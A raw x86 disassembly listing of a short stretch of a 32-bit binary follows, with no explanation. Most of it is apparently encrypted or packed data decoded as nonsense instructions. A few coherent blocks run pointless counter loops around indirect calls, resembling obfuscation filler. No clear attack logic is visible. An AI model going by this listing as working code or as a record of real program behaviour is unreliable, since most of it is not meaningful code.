  40186d:	push   0xffffffb5
  40186f:	cdq    
  401870:	mov    al,ds:0x2469a7d7
  401875:	xor    DWORD PTR [esp+ebp*4-0x6b],ebx
  401879:	fimul  WORD PTR [edi-0x561e8d8c]
  40187f:	call   0x1ac0:0xbe52b761
  401886:	ja     0xbc2193c7
  40188c:	enter  0x53ff,0xdb
  401890:	mov    esi,es
  401892:	int    0xde
  401894:	cmp    dh,dl
  401896:	xchg   edx,eax
  401897:	aam    0x85
  401899:	add    esi,DWORD PTR [esi-0x67]
  40189c:	cwde   
  40189d:	jmp    0xa741bd5c
  4018a2:	mov    edi,0x130a36da
  4018a7:	popa   
  4018a8:	packssdw mm1,QWORD PTR [ebp+0x7da65f52]
  4018af:	shl    BYTE PTR [eax+0x56],0x5e
  4018b3:	fcomp  QWORD PTR [esi]
  4018b5:	call   edx
  4018b7:	pop    esi
  4018b8:	clc    
  4018b9:	add    edx,DWORD PTR [eax]
  4018bb:	mov    es,WORD PTR [edi+0x2c]
  4018be:	xor    BYTE PTR [ecx-0x6f],bl
  4018c1:	or     eax,0xbcaac315
  4018c6:	lds    edx,FWORD PTR [ebx+0x36084f92]
  4018cc:	xchg   esp,eax
  4018cd:	lahf   
  4018ce:	or     esp,DWORD PTR [ebx-0x2be2a0ae]
  4018d4:	(bad)  
  4018d5:	in     eax,dx
  4018d6:	mov    ds:0x69e64e9e,eax
  4018db:	fsubrp st(5),st
  4018dd:	mov    ds:0xef0a6377,al
  4018e2:	dec    edi
  4018e3:	xor    eax,0x5f1b7995
  4018e8:	jnp    0x40195e
  4018ea:	push   es
  4018eb:	hlt    
  4018ec:	loopne 0x40194d
  4018ee:	xchg   esp,eax
  4018ef:	addr16 int3 
  4018f1:	sub    eax,0x377ffe5d
  4018f6:	neg    BYTE PTR [ebx-0x3b31a51f]
  4018fc:	dec    esi
  4018fd:	fnstenv [ebx-0x6e602947]
  401903:	jmp    0x401912
  401905:	jmp    0x1cabbae1
  40190a:	jb     0x401928
  40190c:	ja     0x40196a
  40190e:	shl    BYTE PTR [edx+0x7114709f],1
  401914:	or     eax,0x9b14d9
  401919:	sbb    edi,DWORD PTR [esi-0x62bb83e6]
  40191f:	xor    bl,dl
  401921:	pop    ecx
  401922:	mov    al,0xaa
  401924:	add    BYTE PTR [edi-0x7d],bh
  401927:	push   cs
  401928:	repnz and eax,0x6698746c
  40192e:	(bad)  
  40192f:	mov    eax,ds:0xf1cd01b9
  401934:	jle    0x401947
  401936:	imul   ecx,DWORD PTR [esi+eax*8+0x1d4c4f77],0x44a56ecd
  401941:	stc    
  401942:	dec    esi
  401943:	jae    0x4019be
  401945:	test   BYTE PTR [esp+eiz*2],dh
  401948:	push   ecx
  401949:	adc    ebp,ebx
  40194b:	sbb    bh,BYTE PTR [edi]
  40194d:	mov    ecx,DWORD PTR [esi+eiz*4+0x10]
  401951:	ds sti 
  401953:	es jecxz 0x401932
  401956:	jmp    0x4019a0
  401958:	push   0x248d8ff9
  40195d:	xchg   esp,eax
  40195e:	inc    eax
  40195f:	(bad)  
  401960:	or     al,0x4a
  401962:	stc    
  401963:	je     0x401936
  401965:	or     al,0x34
  401967:	cmc    
  401968:	adc    DWORD PTR [edi],ebx
  40196a:	jne    0x4019dc
  40196c:	cmp    DWORD PTR [ebp+0x49ba981f],0xd51be6b3
  401976:	inc    ecx
  401977:	hlt    
  401978:	mov    al,ds:0xc20b0abd
  40197d:	stos   DWORD PTR es:[edi],eax
  40197e:	out    dx,al
  40197f:	pop    ecx
  401980:	dec    edi
  401981:	dec    ebx
  401982:	add    eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	sub    ah,dl
  4019a5:	xchg   DWORD PTR [edx+eax*4+0x1],ecx
  4019a9:	js     0x401a23
  4019ab:	(bad)  
  4019ac:	jle    0x401a26
  4019ae:	js     0x401a2c
  4019b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019b1:	adc    al,0xb1
  4019b3:	ret    
  4019b4:	cli    
  4019b5:	jp     0x401a1f
  4019b7:	fidivr DWORD PTR [edi]
  4019b9:	jge    0x401974
  4019bb:	in     al,0x74
  4019bd:	jp     0x4019e7
  4019bf:	sbb    DWORD PTR [eax-0x1498bb9a],edx
  4019c5:	and    al,0x38
  4019c7:	fnstcw WORD PTR [ebx]
  4019c9:	sub    cl,BYTE PTR [edx+0x7e24177e]
  4019cf:	fisubr DWORD PTR [ebx]
  4019d1:	shl    BYTE PTR [edi+eiz*8-0x15dc6d85],1
  4019d8:	jae    0x40195a
  4019da:	call   0x959f:0x8a75cad7
  4019e1:	lods   al,BYTE PTR ds:[esi]
  4019e2:	mov    WORD PTR [ebp-0x708598f3],es
  4019e8:	xchg   ecx,eax
  4019e9:	out    0x69,al
  4019eb:	add    ecx,eax
  4019ed:	and    ebp,edx
  4019ef:	call   0x8b46:0xf2920ea4
  4019f6:	mov    dl,0xd3
  4019f8:	pop    ss
  4019f9:	aam    0x38
  4019fb:	rcl    DWORD PTR [edx-0x4a],cl
  4019fe:	in     eax,dx
  4019ff:	retf   0xc076
  401a02:	and    BYTE PTR ds:0x4c18511e,0xa1
  401a09:	cld    
  401a0a:	mov    dl,al
  401a0c:	jmp    0x401a23
  401a0e:	xor    edx,DWORD PTR [eax+eax*4]
  401a11:	sbb    esp,DWORD PTR ss:[ecx-0x77]
  401a15:	call   0x7013:0x2d2f1350
  401a1c:	ret    0x5557
  401a1f:	add    BYTE PTR [eax+0x39dbe6ae],cl
  401a25:	jnp    0x4019fc
  401a27:	push   esi
  401a28:	xor    DWORD PTR [ebx-0x2cb4024b],esi
  401a2e:	ins    BYTE PTR es:[edi],dx
  401a2f:	mov    ds:0x47f052fc,eax
  401a34:	fldz   
  401a36:	add    al,0x68
  401a38:	mov    ch,0xaf
  401a3a:	pop    ebx
  401a3b:	xchg   DWORD PTR [ebx+0x7],edx
  401a3e:	xchg   esp,eax
  401a3f:	nop
  401a40:	mov    dh,0x84
  401a42:	push   eax
  401a43:	xor    DWORD PTR [ebx-0x15],0x4
  401a47:	pop    ds
  401a48:	aaa    
  401a49:	sub    al,0x54
  401a4b:	(bad)  
  401a4c:	gs or  eax,eax
  401a4f:	test   BYTE PTR [ebx-0x3efc2974],ch
  401a55:	or     al,0x1b
  401a57:	jno    0x401a7e
  401a59:	inc    edi
  401a5a:	mov    DWORD PTR [ebp+0x56],ebx
  401a5d:	popa   
  401a5e:	mov    ?,WORD PTR [edi]
  401a60:	push   ebp
  401a61:	fnstcw WORD PTR [ecx-0x1703dd79]
  401a67:	xchg   DWORD PTR [edi],esi
  401a69:	xor    ah,BYTE PTR [edx]
  401a6b:	mov    ebp,0x6ee743d5
  401a70:	mov    WORD PTR [ebp-0x7db54d81],ss
  401a76:	sub    eax,0x6c7e2f4e
  401a7b:	xor    DWORD PTR [eax],esp
  401a7d:	bnd jge 0x401af7
  401a80:	mov    edx,0x83c5bbbc
  401a85:	or     edx,DWORD PTR [edi+eax*8]
  401a88:	push   ebx
  401a89:	pushf  
  401a8a:	ins    DWORD PTR es:[edi],dx
  401a8b:	es mov edx,0x9dfa7f05
  401a91:	retf   0xc4f5
  401a94:	(bad)  
  401a95:	push   ebp
  401a96:	in     al,0x8
  401a98:	push   0x9678d31b
  401a9d:	mov    dl,0xbe
  401a9f:	push   ebx
  401aa0:	ret    0x575
  401aa3:	mov    dl,0xb3
  401aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aa6:	mov    BYTE PTR [ebx+0x68c179a3],bl
  401aac:	pop    esi
  401aad:	xor    BYTE PTR ds:0xc0de071a,dl
  401ab3:	ins    BYTE PTR es:[edi],dx
  401ab4:	scas   al,BYTE PTR es:[edi]
  401ab5:	or     esp,ebp
  401ab7:	xor    DWORD PTR [edi-0x367ce36b],edi
  401abd:	(bad)  
  401abe:	fidivr WORD PTR [ebx]
  401ac0:	outs   dx,BYTE PTR ds:[esi]
  401ac1:	xor    esp,eax
  401ac3:	add    eax,0xae9abf08
  401ac8:	fld    QWORD PTR [ecx-0x30d461e1]
  401ace:	or     cl,BYTE PTR [ebp+edx*2+0x59]
  401ad2:	imul   edx,DWORD PTR [ecx],0x4e
  401ad5:	cmp    esp,DWORD PTR [ecx]
  401ad7:	mov    ch,0xfe
  401ad9:	and    eax,0x103d5e73
  401ade:	xchg   dh,bh
  401ae0:	pop    es
  401ae1:	call   0x5680:0xd62ea88f
  401ae8:	inc    eax
  401ae9:	jb     0x401b2c
  401aeb:	int    0xf2
  401aed:	imul   esi,DWORD PTR [ecx+0x4d1bac8e],0xffffffc6
  401af4:	(bad)  
  401af5:	mov    ecx,ebx
  401af7:	test   BYTE PTR [ebp-0x6a66b3f1],dh
  401afd:	stc    
  401afe:	push   0xffffffcb
  401b00:	dec    esi
  401b01:	popf   
  401b02:	stos   BYTE PTR es:[edi],al
  401b03:	sbb    eax,0x73e8cd81
  401b08:	repz (bad) 
  401b0b:	data16 aad 0x68
  401b0e:	mov    WORD PTR [ebx+0x2a],cs
  401b11:	add    cl,ah
  401b13:	sub    bh,al
  401b15:	stc    
  401b16:	in     al,dx
  401b17:	adc    esp,eax
  401b19:	outs   dx,DWORD PTR ds:[esi]
  401b1a:	sbb    BYTE PTR [ecx],bl
  401b1c:	jmp    0xdbc1:0x4d2b40cd
  401b23:	shl    eax,0x67
  401b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b27:	mov    ebp,0xb9869975
  401b2c:	lods   al,BYTE PTR ds:[esi]
  401b2d:	mov    WORD PTR ds:0xa63ffb04,ss
  401b33:	cmp    eax,0xb3c655dc
  401b38:	xor    eax,0x9208991a
  401b3d:	mov    al,ds:0xb380f23
  401b42:	add    DWORD PTR gs:[ebx+0x7e7c39ba],ecx
  401b49:	pop    eax
  401b4a:	xor    eax,0x322f5720
  401b4f:	mov    al,0xec
  401b51:	mov    ebp,ebp
  401b53:	pop    ss
  401b54:	jno    0x401b84
  401b56:	mov    ebx,0x7be48a1a
  401b5b:	in     al,0x98
  401b5d:	les    edi,FWORD PTR [ecx+eax*8+0x2]
  401b61:	push   cs
  401b62:	pop    esp
  401b63:	enter  0xc4ea,0xcb
  401b67:	shr    DWORD PTR [ebx],1
  401b69:	ss mov ebp,0x8b91180e
  401b6f:	enter  0x8c49,0xc3
  401b73:	fdecstp 
  401b75:	ja     0x401b33
  401b77:	jbe    0x401afd
  401b79:	mov    ds:0x43206af,al
  401b7e:	test   al,0xee
  401b80:	sub    ch,BYTE PTR [esi+0x76bfe8ed]
  401b86:	push   cs
  401b87:	pop    ds
  401b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b89:	add    BYTE PTR [ebp+0x6fb25836],0x18
  401b90:	xor    ebp,DWORD PTR [edi]
  401b92:	jp     0x401bac
  401b94:	lea    esi,[esi+0x35]
  401b97:	jno    0x401bab
  401b99:	repz cmp eax,0x8301c657
  401b9f:	push   esp
  401ba0:	adc    al,0x85
  401ba2:	(bad)  
  401ba3:	stc    
  401ba4:	jb     0x401b6d
  401ba6:	pop    DWORD PTR [ecx-0x3198581]
  401bac:	(bad)  
  401bae:	cmc    
  401baf:	pop    ebx
  401bb0:	int    0xa7
  401bb2:	daa    
  401bb3:	adc    bl,BYTE PTR [edi]
  401bb5:	daa    
  401bb6:	pop    eax
  401bb7:	aad    0xfa
  401bb9:	adc    BYTE PTR [eax+edi*2-0x3ada343b],dl
  401bc0:	lds    edx,FWORD PTR [edi-0x3c1ea6b4]
  401bc6:	dec    ebp
  401bc7:	(bad)  [esi+0x5dd36f74]
  401bcd:	cmp    eax,0xe8df81cf
  401bd2:	push   esp
  401bd3:	adc    BYTE PTR [esi],dh
  401bd5:	(bad)  
  401bd6:	comiss xmm1,xmm7
  401bd9:	mov    ch,BYTE PTR [ebp-0x17ca6065]
  401bdf:	push   ss
  401be0:	mov    edi,0x892a751b
  401be5:	pop    esi
  401be6:	mov    al,0xf6
  401be8:	xchg   ecx,eax
  401be9:	mov    bh,0x6f
  401beb:	aas    
  401bec:	dec    eax
  401bed:	cmp    edx,DWORD PTR [ecx+0x68]
  401bf0:	sub    BYTE PTR [ebx+esi*4-0x59],cl
  401bf4:	es inc ebx
  401bf6:	emms   
  401bf8:	mov    al,0xb1
  401bfa:	icebp  
  401bfb:	jo     0x401c6f
  401bfd:	clc    
  401bfe:	jnp    0x401be0
  401c00:	mov    dh,0xac
  401c02:	fmul   QWORD PTR [ecx+0x7f1f1ae6]
  401c08:	les    edx,FWORD PTR [edx+eiz*4]
  401c0b:	or     DWORD PTR [ebx+0x57],edi
  401c0e:	hlt    
  401c0f:	scas   al,BYTE PTR es:[edi]
  401c10:	retf   
  401c11:	fwait
  401c12:	jmp    FWORD PTR [ebp+0x3af37e77]
  401c18:	cmc    
  401c19:	in     eax,0x25
  401c1b:	mov    WORD PTR [edi-0x7961548c],ss
  401c21:	fldcw  WORD PTR [eax+0x263028b0]
  401c27:	lahf   
  401c28:	mov    ah,0x13
  401c2a:	ret    
  401c2b:	ret    
  401c2c:	test   DWORD PTR [ecx-0x764619a6],esi
  401c32:	inc    ebp
  401c33:	loopne 0x401bb6
  401c35:	and    eax,0x42a83d
  401c3a:	add    BYTE PTR [eax],al
  401c3c:	add    BYTE PTR [eax],al
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xb3ba
  401d05:	push   0x600be3c
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401d64
  401d11:	pop    ecx
  401d12:	call   0x5382:0x719a9663
  401d19:	out    0x6c,eax
  401d1b:	pop    ds
  401d1c:	mov    edx,0x70d71695
  401d21:	push   cs
  401d22:	mov    BYTE PTR [ecx-0x7b7faca8],dl
  401d28:	or     DWORD PTR [edi-0x6abbad81],edi
  401d2e:	out    0x47,al
  401d30:	lock add al,0x6b
  401d33:	pop    ebp
  401d34:	xor    DWORD PTR fs:[eax],0x75
  401d38:	sub    eax,0xacb5e543
  401d3d:	lock dec ebx
  401d3f:	mov    al,ds:0xf43bd803
  401d44:	xor    ebp,DWORD PTR [ebx-0x7a206eba]
  401d4a:	push   ebx
  401d4b:	(bad)  
  401d4f:	add    BYTE PTR [ebx],dl
  401d51:	hlt    
  401d52:	inc    edi
  401d53:	adc    BYTE PTR [edx+eax*2+0x68ba4112],0x8b
  401d5b:	pop    ebx
  401d5c:	aam    0x3c
  401d5e:	int3   
  401d5f:	(bad)  
  401d60:	popf   
  401d61:	loopne 0x401d99
  401d63:	enter  0xb,0xad
  401d67:	add    BYTE PTR [esi-0x18],ch
  401d6a:	(bad)  
  401d6b:	out    0xbb,eax
  401d6d:	ret    
  401d6e:	sub    al,0x1d
  401d70:	add    edx,DWORD PTR [eax]
  401d72:	or     esi,edi
  401d74:	leave  
  401d75:	pop    esi
  401d76:	sbb    bh,al
  401d78:	mov    WORD PTR [ebx-0x3ba818aa],cs
  401d7e:	adc    ebp,DWORD PTR [edx+ebp*2+0x6a76096f]
  401d85:	dec    esi
  401d86:	(bad)  
  401d87:	jo     0x401d77
  401d89:	sub    al,0x91
  401d8b:	repnz rol ebp,1
  401d8e:	xchg   BYTE PTR [esi],al
  401d90:	leave  
  401d91:	add    cl,BYTE PTR [edx+0x5d]
  401d94:	js     0x401d82
  401d96:	(bad)  [esi-0x297cb857]
  401d9c:	bswap  eax
  401d9e:	push   ebp
  401d9f:	pop    eax
  401da0:	xchg   ecx,eax
  401da1:	dec    esi
  401da2:	jge    0x401da8
  401da4:	push   ebp
  401da5:	and    eax,0xcd652f9
  401daa:	inc    eax
  401dab:	shl    DWORD PTR [edi+0x3f],1
  401dae:	jae    0x401da9
  401db0:	mov    edx,0xd3f89936
  401db5:	ins    DWORD PTR es:[edi],dx
  401db6:	sbb    al,0x54
  401db8:	pop    es
  401db9:	push   ss
  401dba:	je     0x401e2b
  401dbc:	in     al,0xb5
  401dbe:	jae    0x401d77
  401dc0:	or     ebp,DWORD PTR ds:0x9ff1c216
  401dc6:	cs and edx,ebx
  401dc9:	call   0x1b4353b2
  401dce:	and    eax,ebx
  401dd0:	or     DWORD PTR [edx-0x7a],eax
  401dd3:	xchg   edi,eax
  401dd4:	adc    ah,ch
  401dd6:	pop    edx
  401dd7:	xchg   edx,eax
  401dd8:	jecxz  0x401dda
  401dda:	outs   dx,BYTE PTR ds:[esi]
  401ddc:	xor    ebp,ebp
  401dde:	out    dx,al
  401ddf:	out    dx,al
  401de0:	xchg   esp,edi
  401de2:	out    dx,eax
  401de3:	and    ebp,esp
  401de5:	pop    edi
  401de6:	and    al,0x7c
  401de8:	shl    BYTE PTR [eax+ecx*1-0x762a17eb],cl
  401def:	push   ds
  401df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401df1:	xchg   ecx,edx
  401df3:	and    ebp,esi
  401df5:	lds    edi,FWORD PTR [esi-0x5]
  401df8:	test   al,0x5a
  401dfa:	xor    cl,BYTE PTR [edi-0x66]
  401dfd:	lds    edi,FWORD PTR [ecx+0x706c2468]
  401e03:	addr16 in al,dx
  401e05:	test   BYTE PTR [edi-0x3fc24939],bh
  401e0b:	imul   eax,edi,0xffffff97
  401e0e:	sub    BYTE PTR [edi],bh
  401e10:	fimul  DWORD PTR [ecx-0xd]
  401e13:	mov    WORD PTR [eax],gs
  401e15:	jp     0x401da8
  401e17:	or     esp,DWORD PTR [ecx-0x318fa5f3]
  401e1d:	sbb    ch,BYTE PTR [ecx]
  401e1f:	jbe    0x401dd3
  401e21:	out    0x17,eax
  401e23:	add    ah,BYTE PTR [eax-0x80]
  401e26:	out    dx,eax
  401e27:	arpl   WORD PTR [esp+edx*4-0x7b],ax
  401e2b:	sub    esp,ebp
  401e2d:	push   ebp
  401e2e:	shl    BYTE PTR [edi+0x4a18af48],0xa5
  401e35:	push   edi
  401e36:	cmp    al,0x2c
  401e38:	mov    edx,0x23d56273
  401e3d:	data16 clc 
  401e3f:	ins    DWORD PTR es:[edi],dx
  401e40:	ret    0x8d7
  401e43:	add    eax,0x8f6746cb
  401e48:	jmp    0x401de1
  401e4a:	push   ebp
  401e4b:	dec    ebp
  401e4c:	dec    ecx
  401e4d:	adc    DWORD PTR [eax],ebx
  401e4f:	jecxz  0x401ddc
  401e51:	sti    
  401e52:	ja     0x401e93
  401e54:	push   ebx
  401e55:	repz push ss
  401e57:	jg     0x401e9f
  401e59:	jmp    0x401ed9
  401e5b:	lds    ebx,FWORD PTR [ecx-0x4d]
  401e5e:	cdq    
  401e5f:	jl     0x401e9c
  401e61:	(bad)  
  401e62:	xor    al,0xab
  401e64:	pop    ecx
  401e65:	loopne 0x401eba
  401e67:	and    esp,DWORD PTR [edx+ebp*2]
  401e6a:	sti    
  401e6b:	cs push ds
  401e6d:	cld    
  401e6e:	cmp    DWORD PTR [ecx],edx
  401e70:	dec    ebp
  401e71:	arpl   WORD PTR [ecx],bx
  401e73:	jge    0x401ea8
  401e75:	inc    eax
  401e76:	jno    0x401ed3
  401e78:	jmp    0x401e17
  401e7a:	cwde   
  401e7b:	jb     0x401e0e
  401e7d:	movq   mm2,mm1
  401e80:	xchg   ebx,eax
  401e81:	(bad)  [ebx+0x54]
  401e84:	xchg   esi,eax
  401e85:	xchg   esp,ecx
  401e87:	xchg   ecx,eax
  401e88:	sub    DWORD PTR [edx],edx
  401e8a:	fwait
  401e8b:	std    
  401e8c:	(bad)  
  401e8e:	cmp    cl,dh
  401e90:	pop    esp
  401e91:	and    BYTE PTR [ecx+0x6027a606],bh
  401e97:	leave  
  401e98:	mul    BYTE PTR [ebp+0x13ceb605]
  401e9e:	pop    ecx
  401e9f:	imul   eax,ecx,0xffffff87
  401ea2:	sbb    BYTE PTR [edi],ah
  401ea4:	mov    ch,0x5
  401ea6:	jnp    0x401ed2
  401ea8:	jno    0x401f1a
  401eaa:	js     0x401f17
  401eac:	adc    edx,esp
  401eae:	cmp    DWORD PTR [edi-0x76],edi
  401eb1:	jmp    0x401e9b
  401eb3:	and    eax,0x57301fc3
  401eb8:	out    0x42,al
  401eba:	jge    0x401e6a
  401ebc:	cmp    DWORD PTR [ebx+0x21],ebx
  401ebf:	aad    0x6c
  401ec1:	inc    ecx
  401ec2:	enter  0x5e5c,0x29
  401ec6:	inc    esi
  401ec7:	je     0x401ef8
  401ec9:	dec    ebp
  401eca:	lahf   
  401ecb:	xor    BYTE PTR [edi],ah
  401ecd:	jg     0x401ed4
  401ecf:	or     al,0xd3
  401ed1:	jns    0x401ee6
  401ed3:	out    0x47,al
  401ed5:	cdq    
  401ed6:	inc    eax
  401ed7:	rol    BYTE PTR gs:[esi+0x52d4b954],0x96
  401edf:	daa    
  401ee0:	imul   ecx,DWORD PTR [eax],0x50f87360
  401ee6:	mov    esp,0xa2af3731
  401eeb:	sbb    bl,BYTE PTR [ebx-0x7c9925b1]
  401ef1:	fmul   DWORD PTR [edx+ebx*2+0x391a67dc]
  401ef8:	pop    ebp
  401ef9:	jae    0x401f2c
  401efb:	mov    ebp,0xf96bdaa3
  401f00:	add    BYTE PTR [edx],ch
  401f02:	jl     0x401f51
  401f04:	mov    esp,0xae6a70fa
  401f09:	inc    eax
  401f0a:	arpl   dx,sp
  401f0c:	repnz jmp 0xc31a:0x318ab3dc
  401f14:	pushf  
  401f15:	sub    eax,0x1acd2df4
  401f1a:	mov    ecx,0xb8891224
  401f1f:	cdq    
  401f20:	mov    ds:0x4e7f6bce,eax
  401f25:	jb     0x401f7e
  401f27:	(bad)  
  401f28:	xchg   ebx,eax
  401f29:	out    0xab,eax
  401f2b:	push   0x8baec4bc
  401f30:	push   edi
  401f31:	xor    edi,DWORD PTR [ecx-0x13]
  401f34:	in     eax,0x5
  401f36:	xchg   esp,eax
  401f37:	or     dl,dh
  401f39:	jl     0x401ec8
  401f3b:	stc    
  401f3c:	inc    esi
  401f3d:	mov    ds:0x245c8b8e,al
  401f42:	repz (bad) 
  401f44:	sbb    cl,BYTE PTR [esi-0x3a0ba3ca]
  401f4a:	rcl    BYTE PTR ds:0x6e9b55a4,0x3a
  401f51:	mov    eax,ds:0x83c8e83b
  401f56:	enter  0x313a,0x23
  401f5a:	inc    eax
  401f5b:	call   0xfba269b6
  401f60:	add    DWORD PTR [esi+0x6f2afcb1],ebp
  401f66:	sbb    eax,0x23bfcd76
  401f6b:	cmp    BYTE PTR [edx+ecx*8],ah
  401f6e:	repz cmc 
  401f70:	mov    DWORD PTR [edi],edx
  401f72:	std    
  401f73:	dec    esp
  401f74:	(bad)  
  401f75:	idiv   BYTE PTR [edi]
  401f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f78:	mov    ds:0x27941423,al
  401f7d:	xchg   BYTE PTR [ebx+0xe],al
  401f80:	add    al,0xd7
  401f82:	adc    DWORD PTR [ebx-0x3e955e8],0x680f9dd6
  401f8c:	ret    
  401f8d:	cmp    al,BYTE PTR [esp+ebp*8+0x80323c0]
  401f94:	xor    eax,eax
  401f96:	add    eax,DWORD PTR ds:0x42a839
  401f9c:	and    eax,DWORD PTR ds:0x42a889
  401fa2:	mov    ds:0x42a839,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a7f1,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a759,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [esi+ebx*2-0x2d],eax
  40201a:	xrelease xchg BYTE PTR [eax+edi*2],al
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x402067
  402024:	in     eax,dx
  402025:	in     al,dx
  402026:	rcl    BYTE PTR [ebx],cl
  402028:	adc    eax,0xf2f2558
  40202d:	xchg   edx,eax
  40202e:	xor    eax,0x9cdd9f15
  402033:	sbb    DWORD PTR [ebx],ecx
  402035:	popf   
  402036:	leave  
  402037:	push   ebx
  402038:	fnstenv [esi-0x3a43d5e7]
  40203e:	outs   dx,DWORD PTR ds:[esi]
  40203f:	dec    eax
  402040:	adc    bl,BYTE PTR [esi+0x18796b2e]
  402046:	mov    al,BYTE PTR [ecx+0x66]
  402049:	and    DWORD PTR [edx],ebx
  40204b:	cmp    al,0x73
  40204d:	lods   eax,DWORD PTR ds:[esi]
  40204e:	stos   BYTE PTR es:[edi],al
  40204f:	mov    al,0x31
  402051:	inc    edi
  402052:	mov    ch,0xb5
  402054:	cmp    eax,0xcd6298be
  402059:	sbb    dl,BYTE PTR [edx+0x1e]
  40205c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40205d:	pop    ebx
  40205e:	lods   eax,DWORD PTR ds:[esi]
  40205f:	jg     0x4020ca
  402061:	int    0xb9
  402063:	add    eax,0x96c6de60
  402068:	jne    0x402072
  40206a:	mov    dh,BYTE PTR [ebx+0x3564b375]
  402070:	mov    cl,0x5
  402072:	dec    esi
  402073:	cmp    eax,0x904af0d9
  402078:	xor    eax,esp
  40207a:	lahf   
  40207b:	add    BYTE PTR [edx+0x20],dl
  40207e:	fmul   DWORD PTR [esi+0x58]
  402081:	push   es
  402082:	inc    edi
  402083:	push   esp
  402084:	mov    eax,0x4cfe3729
  402089:	ins    DWORD PTR es:[edi],dx
  40208a:	sbb    BYTE PTR [edx-0x4a],ah
  40208d:	adc    eax,0x3723c968
  402092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402093:	mov    edx,0xe5d557f
  402098:	bt     DWORD PTR [ebp*1-0x50b225e1],ecx
  4020a0:	hlt    
  4020a1:	jp     0x4020a5
  4020a3:	dec    ebp
  4020a4:	pop    ds
  4020a5:	cwde   
  4020a6:	int3   
  4020a7:	idiv   DWORD PTR [edx]
  4020a9:	and    ah,dl
  4020ab:	test   BYTE PTR [ebp+0x7f9b2611],ah
  4020b1:	ins    BYTE PTR es:[edi],dx
  4020b2:	cmc    
  4020b3:	idiv   DWORD PTR [esi-0x2081b4b1]
  4020b9:	dec    ebp
  4020ba:	adc    ah,ch
  4020bc:	add    dh,BYTE PTR [eax]
  4020be:	mov    ebx,0x6caa9cdc
  4020c3:	sub    al,0x22
  4020c5:	ins    BYTE PTR es:[edi],dx
  4020c6:	repnz ds ins DWORD PTR es:[edi],dx
  4020c9:	addr16 jne 0x4020d4
  4020cc:	shl    BYTE PTR [ebx],cl
  4020ce:	jp     0x40209e
  4020d0:	test   eax,0x8a950b6
  4020d5:	imul   ecx,esp,0xfffffffe
  4020d8:	out    0x9e,al
  4020da:	iret   
  4020db:	and    bh,BYTE PTR [ebp-0x7308d64f]
  4020e1:	clc    
  4020e2:	aas    
  4020e3:	dec    ebx
  4020e4:	imul   edi,DWORD PTR [edx-0x3839b9e4],0xbbe99d18
